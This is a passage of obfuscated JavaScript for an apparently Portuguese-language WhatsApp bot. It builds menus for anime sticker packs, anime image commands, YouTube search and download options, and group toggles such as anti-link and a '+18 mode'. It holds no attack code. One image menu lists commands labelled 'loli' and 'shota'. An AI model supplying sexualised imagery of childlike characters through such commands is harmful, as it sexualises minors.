              txtlista = NomeDoBot + ": 𝐎𝐋𝐀́ 𝐌𝐈𝐍𝐇𝐀 𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐏𝐀𝐂𝐊𝐒 𝐃𝐄 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒";
              txtbotao = "𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐏𝐀𝐂𝐊𝐒";
              await _0x58c3cd(_0x346d97, txtbotao, txtlista, _0x141936, botaoale);
              break;
            case "packsfigsts2":
              const _0x5436e7 = {
                title: "❄️ 𝐌𝐄𝐋𝐈𝐎𝐃𝐀𝐒 ❄️",
                id: "packfig meliodas"
              };
              const _0x285716 = {
                title: "❄️ 𝐌𝐄𝐌𝐄𝐒𝟏 ❄️",
                id: "packfig memes1"
              };
              const _0x517f8b = {
                title: "❄️ 𝐌𝐄𝐌𝐄𝐒𝟐 ❄️",
                id: "packfig memes2"
              };
              const _0x16a5ab = {
                title: "❄️ 𝐌𝐄𝐌𝐄𝐒𝟑 ❄️",
                id: "packfig memes3"
              };
              const _0x28247c = {
                title: "❄️ 𝐌𝐄𝐌𝐄𝐒𝟒 ❄️",
                id: "packfig memes4"
              };
              const _0x6b0010 = {
                title: "❄️ 𝐌𝐄𝐌𝐄𝐒𝟓 ❄️",
                id: "packfig memes5"
              };
              const _0x32d35f = {
                title: "❄️ 𝐌𝐄𝐑𝐄𝐎𝐋𝐄𝐎𝐍𝐀 ❄️",
                id: "packfig mereoleona"
              };
              const _0x4c0a35 = {
                title: "❄️ 𝐌𝐈𝐃𝐎𝐑𝐈𝐘𝐀 ❄️",
                id: "packfig midoriya"
              };
              const _0x21e062 = {
                title: "❄️ 𝐌𝐈𝐓𝐒𝐔𝐑𝐈 ❄️",
                id: "packfig mitsuri"
              };
              const _0x53c55d = {
                title: "❄️ 𝐑𝐈𝐂𝐊 ❄️",
                id: "packfig mmotty"
              };
              const _0x56d9d0 = {
                title: "❄️ 𝐍𝐀𝐆𝐀𝐓𝐎𝐑𝐎 ❄️",
                id: "packfig nagatoro"
              };
              const _0x3cbe95 = {
                title: "❄️ 𝐍𝐀𝐆𝐈 ❄️",
                id: "packfig nagi"
              };
              const _0x36d925 = {
                title: "❄️ 𝐍𝐀𝐍𝐀𝐓𝐒𝐔 𝐍𝐎 𝐓𝐀𝐈𝐙𝐀𝐈𝟏 ❄️",
                id: "packfig nanatsu1"
              };
              const _0x24deaf = {
                title: "❄️ 𝐍𝐀𝐍𝐀𝐓𝐒𝐔 𝐍𝐎 𝐓𝐀𝐈𝐙𝐀𝐈𝟐 ❄️",
                id: "packfig nanatsu2"
              };
              const _0x1a9dea = {
                title: "❄️ 𝐍𝐀𝐑𝐔𝐓𝐎𝟏 ❄️",
                id: "packfig naruto"
              };
              const _0xf10cc4 = {
                title: "❄️ 𝐍𝐀𝐑𝐔𝐓𝐎𝟐 ❄️",
                id: "packfig naruto2"
              };
              const _0x3c79ad = {
                title: "❄️ 𝐍𝐀𝐑𝐔𝐓𝐎𝟑 ❄️",
                id: "packfig naruto3"
              };
              const _0x10d4c4 = {
                title: "❄️ 𝐍𝐄𝐙𝐔𝐊𝐎 ❄️",
                id: "packfig nezuko"
              };
              const _0x3d299e = {
                title: "❄️ 𝐍𝐄𝐙𝐔𝐊𝐎𝟐 ❄️",
                id: "packfig nezuko2"
              };
              const _0x2a41ea = {
                title: "❄️ 𝐍𝐎𝐄𝐋𝐋𝐄 ❄️",
                id: "packfig noelle"
              };
              const _0x19461a = {
                title: "❄️ 𝐎𝐁𝐀𝐍𝐀𝐈 ❄️",
                id: "packfig obanai"
              };
              const _0x4549d8 = {
                title: "❄️ 𝐎𝐁𝐈𝐓𝐎 ❄️",
                id: "packfig obito"
              };
              const _0x44515c = {
                title: "❄️ 𝐎𝐍𝐄 𝐏𝐈𝐄𝐂𝐄 ❄️",
                id: "packfig onepiece"
              };
              const _0x428a64 = {
                title: "❄️ 𝐎𝐓𝐀𝐑𝐔 ❄️",
                id: "packfig otaru"
              };
              const _0x999d52 = {
                title: "❄️ 𝐑𝐀𝐍 ❄️",
                id: "packfig ran"
              };
              const _0x47c29c = {
                title: "❄️ 𝐑𝐄𝐈 ❄️",
                id: "packfig rei"
              };
              const _0x253042 = {
                title: "❄️ 𝐑𝐄𝐍𝐆𝐎𝐊𝐔 ❄️",
                id: "packfig rengoku"
              };
              const _0x3ab137 = {
                title: "❄️ 𝐑𝐇𝐘𝐀 ❄️",
                id: "packfig rhya"
              };
              const _0x1bddd2 = {
                title: "❄️ 𝐑𝐎𝐌𝐀𝐍𝐓𝐈𝐂𝐀𝐒𝟏 ❄️",
                id: "packfig romanticas1"
              };
              const _0x10ebef = {
                title: "❄️ 𝐑𝐎𝐌𝐀𝐍𝐓𝐈𝐂𝐀𝐒𝟐 ❄️",
                id: "packfig romanticas2"
              };
              const _0x228875 = {
                title: "❄️ 𝐑𝐎𝐌𝐀𝐍𝐓𝐈𝐂𝐀𝐒𝟑 ❄️",
                id: "packfig romanticas3"
              };
              const _0x15029b = {
                title: "❄️ 𝐒𝐀𝐈𝐓𝐀𝐌𝐀 ❄️",
                id: "packfig saitama"
              };
              const _0x11029a = {
                title: "❄️ 𝐒𝐀𝐊𝐔𝐑𝐀 ❄️",
                id: "packfig sakura"
              };
              const _0x14aa52 = {
                title: "❄️𝐒𝐀𝐍𝐄𝐌𝐈 ❄️",
                id: "packfig sanemi"
              };
              const _0x2302a6 = {
                title: "❄️ 𝐒𝐄𝐈𝐘𝐀 ❄️",
                id: "packfig seiya"
              };
              const _0x31b6ee = {
                title: "❄️ 𝐒𝐄𝐍𝐏𝐀𝐈 ❄️",
                id: "packfig senpai"
              };
              const _0x22fdea = {
                title: "❄️ 𝐒𝐇𝐈𝐆𝐀𝐑𝐀𝐊𝐈 ❄️",
                id: "packfig shigaraki"
              };
              const _0x17b27c = {
                title: "❄️ 𝐒𝐇𝐈𝐍𝐎𝐁𝐔 ❄️",
                id: "packfig shinobu"
              };
              const _0x40037d = {
                title: "❄️ 𝐒𝐇𝐈𝐍𝐎𝐁𝐔𝟐 ❄️",
                id: "packfig shinobu2"
              };
              const _0x32841b = {
                title: "❄️ 𝐒𝐏𝐑𝐈𝐍𝐆𝐓𝐑𝐀𝐏 ❄️",
                id: "packfig springtrap"
              };
              const _0x1c8b5d = {
                title: "❄️ 𝐓𝐀𝐍𝐉𝐈𝐑𝐎 ❄️",
                id: "packfig tabjiro"
              };
              const _0x735a89 = {
                title: "❄️ 𝐓𝐎𝐊𝐈𝐓𝐎 ❄️",
                id: "packfig tokito"
              };
              const _0x3ff896 = {
                title: "❄️ 𝐓𝐎𝐌𝐈𝐎𝐊𝐀 ❄️",
                id: "packfig tomioka"
              };
              const _0x28609b = {
                title: "❄️ 𝐓𝐎𝐌𝐈𝐎𝐊𝐀𝟐 ❄️",
                id: "packfig tomioka2"
              };
              const _0x27c628 = {
                title: "❄️ 𝐓𝐑𝐈𝐒𝐓𝐄𝟏 ❄️",
                id: "packfig triste1"
              };
              const _0x31a652 = {
                title: "❄️ 𝐓𝐑𝐈𝐒𝐓𝐄𝟐 ❄️",
                id: "packfig triste2"
              };
              const _0x41d801 = {
                title: "❄️ 𝐔𝐙𝐔𝐈 ❄️",
                id: "packfig uzui"
              };
              const _0x1c8ef6 = {
                title: "❄️ 𝐘𝐎𝐒𝐇𝐈 ❄️",
                id: "packfig yoshi"
              };
              const _0x7b8aab = {
                title: "❄️ 𝐙𝐄𝐍𝐈𝐓𝐒𝐔 ❄️",
                id: "packfig zenitsu"
              };
              const _0xe2727c = {
                title: "❄️ 𝐙𝐎𝐑𝐀 ❄️",
                id: "packfig zora"
              };
              adaptedOptions2 = [_0x5436e7, _0x285716, _0x517f8b, _0x16a5ab, _0x28247c, _0x6b0010, _0x32d35f, _0x4c0a35, _0x21e062, _0x53c55d, _0x56d9d0, _0x3cbe95, _0x36d925, _0x24deaf, _0x1a9dea, _0xf10cc4, _0x3c79ad, _0x10d4c4, _0x3d299e, _0x2a41ea, _0x19461a, _0x4549d8, _0x44515c, _0x428a64, _0x999d52, _0x47c29c, _0x253042, _0x3ab137, _0x1bddd2, _0x10ebef, _0x228875, _0x15029b, _0x11029a, _0x14aa52, _0x2302a6, _0x31b6ee, _0x22fdea, _0x17b27c, _0x40037d, _0x32841b, _0x1c8b5d, _0x735a89, _0x3ff896, _0x28609b, _0x27c628, _0x31a652, _0x41d801, _0x1c8ef6, _0x7b8aab, _0xe2727c];
              txtlista = NomeDoBot + ": 𝐎𝐋𝐀́ 𝐌𝐈𝐍𝐇𝐀 𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐏𝐀𝐂𝐊𝐒 𝐃𝐄 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒 𝟐";
              txtbotao = "𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐏𝐀𝐂𝐊𝐒";
              await _0x58c3cd(_0x346d97, txtbotao, txtlista, _0x141936, adaptedOptions2);
              break;
            case "menuanimets":
              const _0x1bc7c4 = {
                title: "🇯🇵 𝗠𝗜𝗞𝗨 🇯🇵",
                id: "animets tsmiku"
              };
              const _0x29cedd = {
                title: "🇯🇵 𝗞𝗨𝗥𝗨𝗠𝗜 🇯🇵",
                id: "animets kurumi"
              };
              const _0x459ddd = {
                title: "🇯🇵 𝗜𝗧𝗢𝗥𝗜 🇯🇵",
                id: "animets itori"
              };
              const _0x58d0c2 = {
                title: "🇯🇵 𝗔𝗞𝗜𝗥𝗔 🇯🇵",
                id: "animets akira"
              };
              const _0x1354fc = {
                title: "🇯🇵 𝗠𝗘𝗚𝗨𝗠𝗜𝗡 🇯🇵",
                id: "animets megumin"
              };
              const _0x100d28 = {
                title: "🇯🇵 𝗧𝗢𝗨𝗞𝗔 𝗖𝗛𝗔𝗡 🇯🇵",
                id: "animets toukachan"
              };
              const _0x2854cd = {
                title: "🇯🇵 𝗞𝗔𝗢𝗥𝗜 🇯🇵",
                id: "animets kaori"
              };
              const _0x142f71 = {
                title: "🇯🇵 𝗢𝗡𝗘 𝗣𝗜𝗘𝗖𝗘 🇯🇵",
                id: "animets onepiece"
              };
              const _0x28ff14 = {
                title: "🇯🇵 𝗧𝗦𝗨𝗡𝗔𝗗𝗘 🇯🇵",
                id: "animets tsunade"
              };
              const _0x3ac183 = {
                title: "🇯🇵 𝗦𝗔𝗦𝗨𝗞𝗘 🇯🇵",
                id: "animets sasuke"
              };
              const _0x7e6547 = {
                title: "🇯🇵 𝗦𝗔𝗞𝗨𝗥𝗔 🇯🇵",
                id: "animets sakura"
              };
              const _0x143538 = {
                title: "🇯🇵 𝗠𝗔𝗗𝗔𝗥𝗔 🇯🇵",
                id: "animets madara"
              };
              const _0x380b7e = {
                title: "🇯🇵 𝗜𝗧𝗔𝗖𝗛𝗜 🇯🇵",
                id: "animets itachi"
              };
              const _0x1add0b = {
                title: "🇯🇵 𝗜𝗡𝗢𝗥𝗜 🇯🇵",
                id: "animets inori"
              };
              const _0x178709 = {
                title: "🇯🇵 𝗛𝗘𝗦𝗧𝗜𝗔 🇯🇵",
                id: "animets hestia"
              };
              const _0x573d1d = {
                title: "🇯🇵 𝗘𝗠𝗜𝗟𝗜𝗔 🇯🇵",
                id: "animets emilia"
              };
              const _0x48a0a6 = {
                title: "🇯🇵 𝗖𝗛𝗜𝗧𝗢𝗚𝗘 🇯🇵",
                id: "animets chitoge"
              };
              const _0x534be7 = {
                title: "🇯🇵 𝗔𝗬𝗨𝗭𝗔𝗪𝗔 🇯🇵",
                id: "animets ayuzawa"
              };
              const _0x424b4d = {
                title: "🇯🇵 𝗔𝗦𝗨𝗡𝗔 🇯🇵",
                id: "animets asuna"
              };
              const _0xd4f7bf = {
                title: "🇯🇵 𝗬𝗨𝗞𝗜 🇯🇵",
                id: "animets yuki"
              };
              const _0x17412e = {
                title: "🇯🇵 𝗗𝗘𝗜𝗗𝗔𝗥𝗔 🇯🇵",
                id: "animets deidara"
              };
              const _0x4b6e22 = {
                title: "🇯🇵 𝗔𝗡𝗔 🇯🇵",
                id: "animets ana"
              };
              const _0x257977 = {
                title: "🇯🇵 𝗥𝗜𝗭𝗘 🇯🇵",
                id: "animets rize"
              };
              const _0x4835f1 = {
                title: "🇯🇵 𝗡𝗘𝗭𝗨𝗞𝗢 🇯🇵",
                id: "animets nezuko"
              };
              const _0xb378f5 = {
                title: "🇯🇵 𝗦𝗔𝗚𝗜𝗥𝗜 🇯🇵",
                id: "animets sagiri"
              };
              const _0x1bb21e = {
                title: "🇯🇵 𝗞𝗔𝗢𝗥𝗜 🇯🇵",
                id: "animets kaori"
              };
              const _0x3a5951 = {
                title: "🇯🇵 𝗡𝗔𝗥𝗨𝗧𝗢 🇯🇵",
                id: "animets naruto"
              };
              const _0x125408 = {
                title: "🇯🇵 𝗠𝗜𝗡𝗔𝗧𝗢 🇯🇵",
                id: "animets minato"
              };
              const _0x283a06 = {
                title: "🇯🇵 𝗛𝗜𝗡𝗔𝗧𝗔 🇯🇵",
                id: "animets hinata"
              };
              const _0x58b6ef = {
                title: "🇯🇵 𝗘𝗥𝗭𝗔 🇯🇵",
                id: "animets erza"
              };
              const _0x419095 = {
                title: "🇯🇵 𝗔𝗡𝗜𝗠𝗘𝗦𝗧𝗜𝗖𝗞 🇯🇵",
                id: "animets animestick"
              };
              const _0x5b00d8 = {
                title: "🇯🇵 𝗪𝗔𝗟𝗟𝗣𝗔𝗣𝗘𝗥𝗔𝗡𝗜𝗠𝗘 🇯🇵",
                id: "animets wallpaperanime"
              };
              const _0x35ca72 = {
                title: "🇯🇵 𝐏𝐑𝐎́𝐗𝐈𝐌𝐀 𝐏𝐀𝐆𝐈𝐍𝐀 🇯🇯🇵",
                id: "menuanime2"
              };
              botaoale = [_0x1bc7c4, _0x29cedd, _0x459ddd, _0x58d0c2, _0x1354fc, _0x100d28, _0x2854cd, _0x142f71, _0x28ff14, _0x3ac183, _0x7e6547, _0x143538, _0x380b7e, _0x1add0b, _0x178709, _0x573d1d, _0x48a0a6, _0x534be7, _0x424b4d, _0xd4f7bf, _0x17412e, _0x4b6e22, _0x257977, _0x4835f1, _0xb378f5, _0x1bb21e, _0x3a5951, _0x125408, _0x283a06, _0x58b6ef, _0x419095, _0x5b00d8, _0x35ca72];
              txtlista = NomeDoBot + ": 𝐎𝐋𝐀́ 𝐀𝐐𝐔𝐈 𝐄𝐒𝐓𝐀́ 𝐌𝐈𝐍𝐇𝐀 𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐀𝐍𝐈𝐌𝐄𝐒";
              txtbotao = "🇯🇵 𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐀𝐍𝐈𝐌𝐄𝐒 🇯🇵";
              await _0x58c3cd(_0x346d97, txtbotao, txtlista, _0x141936, botaoale);
              break;
            case "menuanimets2":
              {
                const _0x3917e8 = {
                  title: "🇯🇵 𝗬𝗨𝗥𝗜 🇯🇵",
                  id: "animets yuri"
                };
                const _0x254faf = {
                  title: "🇯🇵 𝗘𝗕𝗔 🇯🇵",
                  id: "animets eba"
                };
                const _0x224da2 = {
                  title: "🇯🇵 𝗘𝗟𝗔𝗜𝗡𝗔 🇯🇵",
                  id: "animets elaina"
                };
                const _0x338607 = {
                  title: "🇯🇵 𝗦𝗛𝗜𝗡𝗞𝗔 🇯🇵",
                  id: "animets shinka"
                };
                const _0x4d7e44 = {
                  title: "🇯🇵 𝗞𝗔𝗚𝗨𝗥𝗔 🇯🇵",
                  id: "animets kagura"
                };
                const _0x193474 = {
                  title: "🇯🇵 𝗦𝗛𝗜𝗡𝗔 🇯🇵",
                  id: "animets shina"
                };
                const _0x461c31 = {
                  title: "🇯🇵 𝗜𝗦𝗨𝗭𝗨 🇯🇵",
                  id: "animets isuzu"
                };
                const _0x5f3617 = {
                  title: "🇯🇵 𝗚𝗥𝗘𝗠𝗢𝗥𝗬 🇯🇵",
                  id: "animets gremory"
                };
                const _0x9588fc = {
                  title: "🇯🇵 𝗔𝗞𝗜𝗬𝗔𝗠𝗔 🇯🇵",
                  id: "animets akiyama"
                };
                const _0x2a52f4 = {
                  title: "🇯🇵 𝗠𝗜𝗞𝗔𝗦𝗔 🇯🇵",
                  id: "animets mikasa"
                };
                const _0x3001f3 = {
                  title: "🇯🇵 𝗞𝗢𝗧𝗢𝗥𝗜 🇯🇵",
                  id: "animets kotori"
                };
                const _0x128543 = {
                  title: "🇯🇵 𝗞𝗔𝗚𝗔 🇯🇵",
                  id: "animets kaga"
                };
                const _0x2331aa = {
                  title: "🇯🇵 𝗕𝗢𝗥𝗨𝗧𝗢 🇯🇵",
                  id: "animets boruto"
                };
                const _0x191311 = {
                  title: "🇯🇵 𝗖𝗛𝗜𝗛𝗢 🇯🇵",
                  id: "animets chiho"
                };
                const _0x1168a6 = {
                  title: "🇯🇵 𝗧𝗘𝗝𝗜𝗡𝗔 🇯🇵",
                  id: "animets tejina"
                };
                const _0x150660 = {
                  title: "🇯🇵 𝗬𝗨𝗠𝗘𝗞𝗢 🇯🇵",
                  id: "animets yumeko"
                };
                const _0xd6801 = {
                  title: "🇯🇵 𝗦𝗛𝗜𝗡𝗢𝗠𝗜𝗬𝗔 🇯🇵",
                  id: "animets chitoge"
                };
                const _0x313908 = {
                  title: "🇯🇵 𝗬𝗢𝗧𝗦𝗨𝗕𝗔 🇯🇵",
                  id: "animets yotsuba"
                };
                const _0x49f474 = {
                  title: "🇯🇵 𝗟𝗢𝗟𝗜 🇯🇵",
                  id: "animets loli"
                };
                const _0x1080a1 = {
                  title: "🇯🇵 𝗦𝗛𝗢𝗧𝗔 🇯🇵",
                  id: "animets shota"
                };
                const _0x1d441d = {
                  title: "🇯🇵 𝗪𝗔𝗜𝗙𝗨 🇯🇵",
                  id: "animets waifu"
                };
                const _0x9c15c8 = {
                  title: "🇯🇵 𝗪𝗔𝗜𝗙𝗨2 🇯🇵",
                  id: "animets waifu2"
                };
                const _0x26a579 = {
                  title: "🇯🇵 𝗞𝗔𝗢𝗥𝗜 🇯🇵",
                  id: "animets kaori"
                };
                const _0x1a6ac5 = {
                  title: "🇯🇵 𝗡𝗘𝗭𝗨𝗞𝗢 🇯🇵",
                  id: "animets nezuko"
                };
                const _0x55e32a = {
                  title: "🇯🇵 𝗦𝗔𝗚𝗜𝗥𝗜 🇯🇵",
                  id: "animets sagiri"
                };
                const _0x458bb3 = {
                  title: "🇯🇵 𝗞𝗔𝗢𝗥𝗜 🇯🇵",
                  id: "animets kaori"
                };
                let _0x51f375 = [_0x3917e8, _0x254faf, _0x224da2, _0x338607, _0x4d7e44, _0x193474, _0x461c31, _0x5f3617, _0x9588fc, _0x2a52f4, _0x3001f3, _0x128543, _0x2331aa, _0x191311, _0x1168a6, _0x150660, _0xd6801, _0x313908, _0x49f474, _0x1080a1, _0x1d441d, _0x9c15c8, _0x26a579, _0x1a6ac5, _0x55e32a, _0x458bb3];
                await _0x58c3cd(_0x346d97, "𝐌𝐄𝐍𝐔2", "𝐀𝐐𝐔𝐈 𝐄𝐒𝐓𝐀́ 𝐌𝐈𝐍𝐇𝐀 𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐀𝐍𝐈𝐌𝐄𝐒", _0x141936, _0x51f375);
              }
              break;
            case "playts":
              {
                if (!_0x11e99e) {
                  return _0x50740b("Cadê o título da música que deseja pesquisar?");
                }
                _0x3a9183 = await _0x3af65f(_0x11e99e);
                _0x36d5cf = await yts(_0x3a9183);
                try {
                  var _0x40bbe8 = [];
                  for (let _0x13752d of _0x36d5cf.videos) {
                    const _0x162601 = {
                      title: _0x13752d.title,
                      id: "playts2 " + _0x13752d.url,
                      descrip: "canal: " + _0x13752d.author.name,
                      stts: _0x13752d.timestamp
                    };
                    _0x40bbe8.push(_0x162601);
                  }
                  _0x58c3cd(_0x346d97, "❄️𝒑𝒆𝒔𝒒𝒖𝒊𝒔𝒂 𝒆𝒏𝒄𝒐𝒏𝒕𝒓𝒂𝒅𝒂❄️", "❄️𝐄𝐬𝐜𝐨𝐥𝐡𝐚 𝐒𝐮𝐚 𝐌𝐮́𝐬𝐢𝐜𝐚 𝐄𝐧𝐭𝐫𝐞 𝐎𝐬 𝐑𝐞𝐬𝐮𝐥𝐭𝐚𝐝𝐨𝐬❄️", _0x141936, _0x40bbe8);
                } catch (_0x4db8d5) {
                  _0x50740b("Ocorreu um erro. Provavelmente sua pesquisa não foi encontrada.\n" + _0x4db8d5);
                }
              }
              break;
            case "playts2":
              const _0x3f3d11 = {
                title: "🎧 𝑨𝑼𝑫𝑰𝑶 📀",
                id: "play_audio " + _0x11e99e
              };
              const _0x24f711 = {
                title: "🎧 𝑨𝑼𝑫𝑰𝑶 2 📀",
                id: "play2 " + _0x11e99e
              };
              const _0xb6c15 = {
                title: "🎧 𝑨𝑼𝑫𝑰𝑶 3 📀",
                id: "play3 " + _0x11e99e
              };
              const _0x1c8319 = {
                title: "📽 𝑽𝑰𝑫𝑬𝑶 🖥",
                id: "play_video " + _0x11e99e
              };
              const _0x3881ff = {
                title: "📽 𝑽𝑰𝑫𝑬𝑶 2 🖥",
                id: "play2_video " + _0x11e99e
              };
              const _0x12b554 = {
                title: "📽 𝑽𝑰𝑫𝑬𝑶 3 🖥",
                id: "play3_video " + _0x11e99e
              };
              const _0x39041c = {
                title: "📁 𝑫𝑶𝑪𝑼𝑴𝑬𝑵𝑻𝑶 📁",
                id: "playdoc " + _0x11e99e
              };
              const _0x27856b = {
                title: "📁 𝑫𝑶𝑪𝑼𝑴𝑬𝑵𝑻𝑶 2 📁",
                id: "playdoc2 " + _0x11e99e
              };
              const _0xb34c3b = {
                title: "🎥 𝟯𝟲𝟬𝗣 🎥",
                id: "360p " + _0x11e99e
              };
              const _0x1b0c8f = {
                title: "🎥 𝟰𝟴𝟬𝗣 🎥",
                id: "480p " + _0x11e99e
              };
              const _0x349ad1 = {
                title: "🎥 𝟭𝟬𝟴𝟬𝗣 🎥",
                id: "1080p " + _0x11e99e
              };
              options = [_0x3f3d11, _0x24f711, _0xb6c15, _0x1c8319, _0x3881ff, _0x12b554, _0x39041c, _0x27856b, _0xb34c3b, _0x1b0c8f, _0x349ad1];
              txtbotao = "🎥 𝐎𝐏𝐂̧𝐎̃𝐄𝐒 📀";
              txtlista = "🎥 𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐄 𝐔𝐌𝐀 𝐃𝐀𝐒 𝐎𝐏𝐂̧𝐎̃𝐄𝐒 📀";
              _0x58c3cd(_0x346d97, txtbotao, txtlista, _0x141936, options);
              break;
            case "ativacoests":
              {
                const _0x15b306 = {
                  title: '' + (!_0x5bea47 ? "✅ 𝐑𝐄𝐒𝐏𝐎𝐍𝐃𝐄𝐑 𝐒𝐎 𝐀𝐃𝐌s ✅" : "❌ 𝐑𝐄𝐒𝐏𝐎𝐍𝐃𝐄𝐑 𝐀 𝐓𝐎𝐃𝐎𝐒 ❌"),
                  id: '' + (!_0x5bea47 ? "so_adm 1" : "so_adm 0"),
                  stts: '' + (!_0x5bea47 ? "Ativar" : "Desativar")
                };
                const _0x494d8a = {
                  title: '' + (!_0x40d1ba ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐋𝐈𝐌𝐈𝐓𝐄 𝐂𝐀𝐑𝐀𝐂𝐓𝐄𝐑𝐄𝐒 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐋𝐈𝐌𝐈𝐓𝐄 𝐂𝐀𝐑𝐀𝐂𝐓𝐄𝐑𝐄𝐒 ❌"),
                  id: '' + (!_0x40d1ba ? "limitecaracteres 1" : "limitecaracteres 0"),
                  stts: '' + (!_0x40d1ba ? "Ativar" : "Desativar")
                };
                const _0x215143 = {
                  title: '' + (!_0x2d5ff0 ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐌𝐎𝐃𝐎 𝐗9 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐌𝐎𝐃𝐎 𝐗9 ❌"),
                  id: '' + (!_0x2d5ff0 ? "x9 1" : "x9 0"),
                  stts: '' + (!_0x2d5ff0 ? "Ativar" : "Desativar")
                };
                const _0x1bbf2b = {
                  title: '' + (!_0x2f3424 ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐌𝐎𝐃𝐎+𝟏𝟖 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐌𝐎𝐃𝐎+𝟏𝟖 ❌"),
                  id: '' + (!_0x2f3424 ? "modo+18 1" : "modo+18 0"),
                  stts: '' + (!_0x2f3424 ? "Ativar" : "Desativar")
                };
                const _0x32f143 = {
                  title: '' + (!_0x5c6233 ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐌𝐎𝐃𝐎 𝐁𝐑𝐈𝐍𝐂𝐀𝐃𝐄𝐈𝐑𝐀 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐌𝐎𝐃𝐎 𝐁𝐑𝐈𝐍𝐂𝐀𝐃𝐄𝐈𝐑𝐀 ❌"),
                  id: '' + (!_0x5c6233 ? "modobrincadeira 1" : "modobrincadeira 0"),
                  stts: '' + (!_0x5c6233 ? "Ativar" : "Desativar")
                };
                const _0x4ee194 = {
                  title: '' + (!_0x40dfc7 ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐎 𝐋𝐄𝐕𝐄𝐋𝐈𝐍𝐆 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐎 𝐋𝐄𝐕𝐄𝐋𝐈𝐍𝐆 ❌"),
                  id: '' + (!_0x40dfc7 ? "autofigu 1" : "autofigu 0"),
                  stts: '' + (!_0x40dfc7 ? "Ativar" : "Desativar")
                };
                const _0x598cf4 = {
                  title: '' + (!_0x33d21e ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐒𝐈𝐒𝐓𝐄𝐌𝐀 𝐃𝐄 𝐆𝐎𝐋𝐃 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐎 𝐒𝐈𝐒𝐓𝐄𝐌𝐀 𝐃𝐄 𝐆𝐎𝐋𝐃 ❌"),
                  id: '' + (!_0x33d21e ? "sistemgold 1" : "sistemgold 0"),
                  stts: '' + (!_0x33d21e ? "Ativar" : "Desativar")
                };
                const _0x16d7f9 = {
                  title: '' + (!_0x2623e0 ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐒𝐈𝐌𝐈𝐇𝟐 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐒𝐈𝐌𝐈𝐇 ❌"),
                  id: '' + (!_0x2623e0 ? "simih2 1" : "simih2 0"),
                  stts: '' + (!_0x2623e0 ? "Ativar" : "Desativar")
                };
                const _0x314ab5 = {
                  title: '' + (!_0x21877a ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐁𝐄𝐌-𝐕𝐈𝐍𝐃𝐎 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐁𝐄𝐌-𝐕𝐈𝐍𝐃𝐎 ❌"),
                  id: '' + (!_0x21877a ? "bemvindo 1" : "bemvindo 0"),
                  stts: '' + (!_0x21877a ? "Ativar" : "Desativar")
                };
                const _0xe433b = {
                  title: '' + (!_0x25178f ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐁𝐄𝐌-𝐕𝐈𝐍𝐃𝐎𝟐 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐁𝐄𝐌-𝐕𝐈𝐍𝐃𝐎𝟐 ❌"),
                  id: '' + (!_0x21877a ? "bemvindo2 1" : "bemvindo2 0"),
                  stts: '' + (!_0x21877a ? "Ativar" : "Desativar")
                };
                const _0x210506 = {
                  title: '' + (!_0x2b140d ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐋𝐈𝐍𝐊 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐋𝐈𝐍𝐊 ❌"),
                  id: '' + (!_0x2b140d ? "antilink 1" : "antilink 0"),
                  stts: '' + (!_0x2b140d ? "Ativar" : "Desativar")
                };
                const _0x656835 = {
                  title: '' + (!_0x83ee35 ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐋𝐈𝐍𝐊 𝐀𝐃𝐕 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐋𝐈𝐍𝐊 𝐀𝐃𝐕 ❌"),
                  id: '' + (!_0x83ee35 ? "advlink" : "advlink"),
                  stts: '' + (!_0x83ee35 ? "Ativar" : "Desativar")
                };
                const _0x4eeac5 = {
                  title: '' + (!_0x3cafb4 ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐋𝐈𝐍𝐊 𝐆𝐏 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐋𝐈𝐍𝐊 𝐆𝐏 ❌ "),
                  id: '' + (!_0x3cafb4 ? "antilinkgp 1" : "antilinkgp 0"),
                  stts: '' + (!_0x3cafb4 ? "Ativar" : "Desativar")
                };
                const _0x3c7193 = {
